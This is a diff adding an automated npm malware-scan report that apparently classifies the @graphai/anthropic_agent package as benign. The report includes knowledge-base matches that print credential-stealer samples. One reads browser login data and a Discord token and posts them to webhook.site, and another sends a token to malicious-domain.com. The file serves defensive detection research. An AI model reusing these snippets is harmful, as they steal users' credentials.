@@ -1,0 +1,500 @@
+{
+  "package_name": "@graphai##anthropic_agent",
+  "package_version": "1.0.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T16:59:37.048320",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/index.js",
+    "package/lib/anthropic_agent.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@graphai##anthropic_agent/1.0.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@graphai##anthropic_agent/1.0.1/package/lib/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@graphai##anthropic_agent/1.0.1/package/lib/anthropic_agent.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "anthropic_agent_slice_1",
+          "code_snippet": "\"use strict\";\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.anthropicAgent = void 0;\nconst sdk_1 = __importDefault(require(\"@anthropic-ai/sdk\"));\nconst llm_utils_1 = require(\"@graphai/llm_utils\");\nconst convToolCall = (tool_call) => {\n    const { id, name, input } = tool_call;\n    return { id, name, arguments: input };\n};\n// https://docs.anthropic.com/ja/api/messages\nconst convertOpenAIChatCompletion = (response, messages) => {\n    // SDK bug https://github.com/anthropics/anthropic-sdk-typescript/issues/432\n    const text = response.content[0].text;\n    const functionResponses = response.content.filter((content) => content.type === \"tool_use\") ?? [];\n    const tool_calls = functionResponses.map(convToolCall);\n    const tool = tool_calls[0] ? tool_calls[0] : undefined;\n    const message = { role: response.role, content: text };\n    messages.push(message);\n    return { ...response, choices: [{ message }], text, tool, tool_calls, message, messages };\n};\nconst anthropicAgent = async ({ params, namedInputs, filterParams, config, }) => {\n    const { verbose, system, temperature, tools, tool_choice, max_tokens, prompt, messages } = { ...params, ...namedInputs };\n    const { apiKey, stream, forWeb, model } = {\n        ...params,\n        ...(config || {}),\n    };\n    const userPrompt = (0, llm_utils_1.getMergeValue)(namedInputs, params, \"mergeablePrompts\", prompt);\n    const systemPrompt = (0, llm_utils_1.getMergeValue)(namedInputs, params, \"mergeableSystem\", system);\n    const messagesCopy = messages ? messages.map((m) => m) : [];\n    if (userPrompt) {\n        messagesCopy.push({\n            role: \"user\",\n            content: userPrompt,\n        });\n    }\n    if (verbose) {\n        console.log(messagesCopy);\n    }\n    const anthropic_tools = tools && tools.length > 0\n        ? tools.map((tool) => {\n            const { function: func } = tool;\n            const { name, description, parameters } = func;\n            return {\n                name,\n                description,\n                input_schema: parameters,\n            };\n        })\n        : undefined;\n    const anthropic = new sdk_1.default({ apiKey, dangerouslyAllowBrowser: !!forWeb });\n    const chatParams = {\n        model: model ?? \"claude-3-5-sonnet-latest\",\n        messages: messagesCopy,\n        tools: anthropic_tools,\n        tool_choice,\n        system: systemPrompt,\n        temperature: temperature ?? 0.7,\n        max_tokens: max_tokens ?? 1024,\n    };\n    if (!stream) {\n        const messageResponse = await anthropic.messages.create(chatParams);\n        return convertOpenAIChatCompletion(messageResponse, messagesCopy);\n    }\n    const chatStream = await anthropic.messages.create({\n        ...chatParams,\n        stream: true,\n    });\n    const contents = [];\n    const partials = [];\n    let streamResponse = null;\n    for await (const messageStreamEvent of chatStream) {\n        if (messageStreamEvent.type === \"message_start\") {\n            streamResponse = messageStreamEvent.message;\n        }\n        if (messageStreamEvent.type === \"content_block_start\") {\n            if (streamResponse) {\n                streamResponse.content.push(messageStreamEvent.content_block);\n            }\n            partials.push(\"\");\n        }\n        if (messageStreamEvent.type === \"content_block_delta\") {\n            const { index, delta } = messageStreamEvent;\n            if (delta.type === \"input_json_delta\") {\n                partials[index] = partials[index] + delta.partial_json;\n            }\n            if (delta.type === \"text_delta\") {\n                partials[index] = partials[index] + delta.text;\n            }\n        }\n        if (messageStreamEvent.type === \"content_block_delta\" && messageStreamEvent.delta.type === \"text_delta\") {\n            const token = messageStreamEvent.delta.text;\n            contents.push(token);\n            if (filterParams && filterParams.streamTokenCallback && token) {\n                filterParams.streamTokenCallback(token);\n            }\n        }\n    }\n    if (streamResponse === null) {\n        throw new Error(\"Anthoropic no response\");\n    }\n    partials.forEach((partial, index) => {\n        if (streamResponse.content[index].type === \"text\") {\n            streamResponse.content[index].text = partial;\n        }\n        if (streamResponse.content[index].type === \"tool_use\") {\n            streamResponse.content[index].input = JSON.parse(partial);\n        }\n    });\n    return convertOpenAIChatCompletion(streamResponse, messagesCopy);\n};\nexports.anthropicAgent = anthropicAgent;\nconst anthropicAgentInfo = {\n    name: \"anthropicAgent\",\n    agent: exports.anthropicAgent,\n    mock: exports.anthropicAgent,\n    inputs: {\n        type: \"object\",\n        properties: {\n            model: { type: \"string\" },\n            system: { type: \"string\" },\n            max_tokens: { type: \"number\" },\n            temperature: { type: \"number\" },\n            prompt: {\n                type: \"string\",\n                description: \"query string\",\n            },\n            messages: {\n                anyOf: [{ type: \"string\" }, { type: \"integer\" }, { type: \"object\" }, { type: \"array\" }],\n                description: \"chat messages\",\n            },\n        },\n    },\n    output: {\n        type: \"object\",\n    },\n    samples: [],\n    description: \"Anthropic Agent\",\n    category: [\"llm\"],\n    author: \"Receptron team\",\n    repository: \"https://github.com/receptron/graphai\",\n    license: \"MIT\",\n    stream: true,\n    environmentVariables: [\"ANTHROPIC_API_KEY\"],\n    npms: [\"@anthropic-ai/sdk\"],\n};\nexports.default = anthropicAgentInfo;",
+          "is_malicious": false,
+          "malice_score": 0.4626862605412801,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses the ANTHROPIC_API_KEY environment variable and uses the @anthropic-ai/sdk to send chat messages and prompts over the network to the Anthropic API endpoints. It constructs chat requests including user and system prompts, optional tools, and streams or non-streams responses, processing and returning the AI-generated content. This behavior enables remote interaction with a cloud-based language model service, potentially exposing sensitive prompt data and API keys over HTTPS.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate integration with the Anthropic AI SDK to send chat messages and receive responses from a cloud-based language model service. It uses an API key from environment variables to authenticate requests, which is standard practice for API clients. Unlike the known malicious patterns, it does not embed secrets into prompts, does not exfiltrate sensitive local data, nor does it perform any unauthorized system or network operations. The code handles streaming and non-streaming responses, processes messages, and returns AI-generated content without suspicious obfuscation or data leakage. The presence of environment variables and network calls to a known API endpoint is expected behavior for such an agent and does not indicate malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5076999068260193,
+              "code_similarity": 0.43900007009506226,
+              "behavior_similarity": 0.5763997435569763,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104218_627233_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_104218_627233/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4649413824081421,
+              "code_similarity": 0.3795894384384155,
+              "behavior_similarity": 0.5502933263778687,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + secretApiKey;\nresponse = LLM.generate(systemPrompt + userPrompt);\nreturn response;",
+                "code_behavior": "At runtime (system prompt construction), the code embeds sensitive information such as API keys into the system prompt, which is then concatenated with user input and passed to the LLM, risking exposure of secrets if the prompt or its content is leaked to users or attackers.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets or sensitive configuration data in prompts exposes them to potential leakage through LLM outputs, especially if prompt content is revealed or can be extracted by adversarial queries.",
+                  "violated_expectations": "System prompts must never contain secrets or sensitive data; secrets should be managed via secure channels and never exposed to the LLM context.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; all secrets should be handled securely and separately from prompt construction.",
+                  "key_indicators": [
+                    "Secrets or API keys concatenated into prompt strings",
+                    "Prompt content not isolated from user-accessible output",
+                    "Potential for prompt leakage and secret exposure"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "Prompt engineering logic (backend or API layer)",
+                  "required_permissions": [
+                    "access to sensitive configuration or secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not analyze a specific software package, but instead details new classes of vulnerabilities and attack patterns relevant to large language model (LLM) applications. These include unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. If exploited, these risks can result in denial of service, financial loss, data leakage, model theft, and unauthorized actions by LLM-based agents, representing significant threats to LLM application security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted requests to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or excessive financial cost."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker injects malicious vectors or embeddings into the RAG pipeline or embedding store.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Manipulation of LLM outputs, data poisoning, or exfiltration of sensitive information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to extract system prompts containing sensitive data or instructions.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exposure of secrets, internal logic, or further attack vectors."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agents to trigger unauthorized or risky actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of inference requests from a single user or IP, indicating potential abuse of unbounded inference endpoints",
+                    "Unvalidated or unsanitized vectors/embeddings being stored or retrieved in the embedding store, suggesting possible poisoning attempts",
+                    "System prompts containing secrets or sensitive configuration data, detectable via prompt construction audits or output analysis",
+                    "LLM agents performing sensitive actions (e.g., file deletion, fund transfer) without human approval or explicit permission checks"
+                  ],
+                  "file_indicators": [
+                    "Embedding store files containing unexpected, malformed, or adversarial vectors",
+                    "Prompt logs or debug files containing API keys, secrets, or sensitive configuration data",
+                    "Agent orchestration scripts or configuration files lacking permission or approval checks for sensitive actions"
+                  ],
+                  "network_indicators": [
+                    "Excessive API calls to LLM inference endpoints from a single source",
+                    "Unusual outbound requests or transactions initiated by LLM agent actions (e.g., file deletions, fund transfers)",
+                    "Data exfiltration patterns or anomalous responses following prompt leakage or embedding attacks"
+                  ],
+                  "how_to_detect": "Continuously monitor for excessive or anomalous inference requests per user or IP, enforce validation and sanitization of all vectors/embeddings before storage, audit prompt construction logic for embedded secrets, and require strict permission checks and human-in-the-loop controls for all LLM agent-initiated sensitive actions. Set up alerts for any system prompt content containing secrets, and flag agentic actions that bypass explicit approval or permission workflows."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43121254444122314,
+              "code_similarity": 0.37680670619010925,
+              "behavior_similarity": 0.4856184124946594,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104205_631146_snippet_1",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4207282066345215,
+              "code_similarity": 0.32675638794898987,
+              "behavior_similarity": 0.5147000551223755,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode for unbounded inference loop\nwhile (userRequestsInference) {\n    result = LLM.generate(userPrompt);\n    sendToUser(result);\n}",
+                "code_behavior": "At runtime, the code processes user-initiated LLM inference requests in an unbounded loop, directly invoking LLM.generate with userPrompt and sending results to the user, resulting in unlimited resource consumption and potential denial of service.",
+                "malice_analysis": {
+                  "why_suspicious": "Allowing unrestricted, repeated LLM inferences enables attackers to exhaust compute resources, degrade service for legitimate users, or incur excessive operational costs.",
+                  "violated_expectations": "Production LLM applications are expected to enforce rate limits, quotas, or cost controls to prevent abuse; this code omits all such safeguards, violating standard security and operational practices.",
+                  "similar_legitimate_use": "Unbounded inference loops may be used in isolated research or internal testing environments where resource abuse is not a concern, but are never appropriate in production or public-facing systems.",
+                  "key_indicators": [
+                    "Absence of rate limiting or quota enforcement in inference loop",
+                    "Direct, repeated invocation of LLM.generate based on user input",
+                    "No checks on user request frequency or resource usage"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user query/inference)",
+                  "file_location": "LLM application backend (API handler, inference engine)",
+                  "required_permissions": [
+                    "network",
+                    "compute resources"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_371059_snippet_1",
+              "source_package": "LofyLife (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_113914_371059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40693479776382446,
+              "code_similarity": 0.34619271755218506,
+              "behavior_similarity": 0.4676768481731415,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// JavaScript code (representative)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nif (token) {\n  https.request({\n    hostname: 'malicious-domain.com',\n    path: '/exfiltrate',\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' }\n  }, req => {}).end(JSON.stringify({ token }));\n}",
+                "code_behavior": "At import-time, the code accesses the DISCORD_TOKEN environment variable, constructs an HTTPS POST request, and sends the token to a hardcoded external domain, resulting in immediate credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive environment variable (DISCORD_TOKEN) and exfiltrates it to an external, attacker-controlled domain as soon as the package is imported, which is a direct credential theft technique.",
+                  "violated_expectations": "Legitimate npm packages do not access Discord tokens or transmit them to external servers during import or installation. Such behavior is outside the scope of normal package operations.",
+                  "similar_legitimate_use": "Legitimate packages may send anonymized telemetry or error data to a vendor's server, but never user credentials or tokens, especially not at import-time.",
+                  "key_indicators": [
+                    "Access to DISCORD_TOKEN environment variable",
+                    "Hardcoded external domain (malicious-domain.com) for exfiltration",
+                    "Network request initiated at import-time",
+                    "Immediate exfiltration of sensitive credentials"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of the npm package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "LofyLife",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all known versions affected)",
+                  "why_malicious": "The package contains both Python and JavaScript code designed to steal Discord tokens and infect Discord client files. It monitors user actions such as logins, credential changes, and payment method modifications, exfiltrating sensitive data to an attacker-controlled server. Its primary purpose is credential theft and user surveillance, leveraging cross-language payloads and unauthorized file modifications."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial credential exfiltration via environment variable access and setup for further monitoring."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code infects Discord client files and sets up monitoring for user actions.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Continuous surveillance of user activity and exfiltration of sensitive events to the attacker's infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Embedded Python script is invoked to perform additional credential theft.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Redundant or parallel exfiltration of Discord tokens to the attacker, increasing the likelihood of successful data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to DISCORD_TOKEN environment variable by npm packages",
+                    "Network requests to unknown or hardcoded domains (e.g., malicious-domain.com) at import-time or runtime",
+                    "Modification or injection of files within Discord's application directories by third-party packages",
+                    "Invocation of embedded Python scripts from JavaScript code in npm packages",
+                    "Persistent monitoring of Discord's local storage or credential-related files"
+                  ],
+                  "file_indicators": [
+                    "Presence of embedded Python scripts (e.g., .py files) in npm packages",
+                    "Unexpected writes or modifications to Discord installation directories (e.g., /path/to/discord/app/infected.js)",
+                    "Injected or modified files within Discord's app folders, especially those not present in official distributions"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with Discord or npm (e.g., malicious-domain.com/exfiltrate)",
+                    "Connections to known malicious exfiltration endpoints as specified in the code"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for access to sensitive environment variables such as DISCORD_TOKEN, unexpected network requests to untrusted or hardcoded domains, and file modifications within Discord's application directories. Flag npm packages containing embedded Python scripts or those that attempt to execute non-JavaScript code. Use endpoint monitoring to detect unauthorized changes to Discord client files and outbound connections to known malicious infrastructure. Correlate behavioral, file, and network indicators for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
